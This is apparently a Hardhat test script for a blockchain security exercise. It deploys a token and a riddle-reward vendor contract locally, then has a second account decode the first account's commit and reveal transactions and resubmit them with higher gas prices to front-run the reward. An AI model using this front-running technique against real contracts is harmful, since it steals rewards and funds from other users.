//@ts-nocheck
import { ethers } from "hardhat";
import { CampusToken, FHCWVendor } from "../../typechain-types";
import hre from "hardhat";
import { AddressLike } from "ethers";
import vendorABI from "../../artifacts/contracts/FHCWVendor.sol/FHCWVendor.json"

async function main() {

    const provider = ethers.provider;

    let owner: AddressLike;
    let addr1: AddressLike;
    let addr2: AddressLike;
    let addr3: AddressLike;

    [owner, addr1, addr2, addr3] = await hre.ethers.getSigners();
    console.log(`Addresses:\r\n
        1: ${await addr1.getAddress()}
        2: ${await addr2.getAddress()}
        3: ${await addr3.getAddress()}
    `);

    // ABI used to decrypt data from riddleReward transaction
    const ABI = vendorABI.abi
    // Interface to use ethers decoder base on the ABI parsed
    const iface = new ethers.Interface(ABI)

    const campusToken: CampusToken = await ethers.deployContract("CampusToken");
    
    await campusToken.waitForDeployment();

    console.log(`CampusToken deployed to ${campusToken.target}`);

    const vendorMachine: FHCWVendor = await ethers.deployContract("FHCWVendor", [campusToken.target])

    await vendorMachine.waitForDeployment();

    console.log(`FHCWVendor deployed to ${vendorMachine.target}`);

    const roleHash = await campusToken.PRIV_ROLE();

    let tx = await campusToken.grantRole(roleHash, vendorMachine.target)
    await tx.wait();

    console.log(await campusToken.hasRole(roleHash, vendorMachine.target) ? `Is priviliged` : `Didn't get priviliges`)

    // Equals 50.000 Tokens
    const initialVendorTokens = 500_000

    // Mint tokens for FHCWVendor and add them to the VendorContract address
    tx = await campusToken.mint(vendorMachine.target, initialVendorTokens);
    await tx.wait();

    console.log(`FHCWVendor now has ${await vendorMachine.balanceOfVendor() / BigInt(10)} Tokens`);

    // Owner transfers 10 ETH to Vendor - Needed so we can extract the funds from the Vendor in our attack
    tx = await owner.sendTransaction({
        to: vendorMachine.target,
        value: ethers.parseEther("10")
    })
    await tx.wait()

    console.log(`Vendor ETH balance: ${BigInt(await provider.getBalance(vendorMachine.target)) / BigInt(10 ** 18)}`)

    const guesserSecret = "ganzgeheim123!"
    const guesserGuess = "Raccoon"

    // Adds the address of Addr1, its secret and its guess
    const addr1Hash = ethers.solidityPackedKeccak256(["address", "string", "string"], [(await addr1.getAddress()).toLowerCase(), guesserGuess, guesserSecret])
    // console.log(`Addr1 Hash: ${addr1Hash}`) // Shows the Hash calculated from the inputs
    
    tx = await vendorMachine.connect(addr1).commitSolution(addr1Hash, {gasPrice: 50 * 10 ** 9})
    let listenedData = iface.parseTransaction({data: tx.data, value: tx.value})
    // console.log(listenedData) // If you want more information on what information can be listened on

    // Addr2 takes the calculated hash from Addr1 and uses it as own solutionCommit
    tx = await vendorMachine.connect(addr2).commitSolution(listenedData.args[0], {gasPrice: 150 * 10 ** 9})
    
    await tx.wait()
    await tx.wait()

    // Addr1 reveals solution with hash and all the other stuff
    const tx2 = await vendorMachine.connect(addr1).revealSolution(guesserGuess, guesserSecret, {gasPrice: 50 * 10 ** 9})
    listenedData = iface.parseTransaction({data: tx2.data, value: tx2.value})
    console.log(listenedData)

    // Tries to reveal the solution with
    try {
        tx = await vendorMachine.connect(addr2).revealSolution(listenedData.args[0], listenedData.args[1], {gasPrice: 150 * 10 ** 9})
        await tx.wait()
    } catch (error) {
        console.log(`Reverted with error: ${error}`)
    }

    await tx2.wait()

    console.log(`Addr1 Balance: ${await provider.getBalance(addr1)}`)
    console.log(`Addr2 Balance: ${await provider.getBalance(addr2)}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
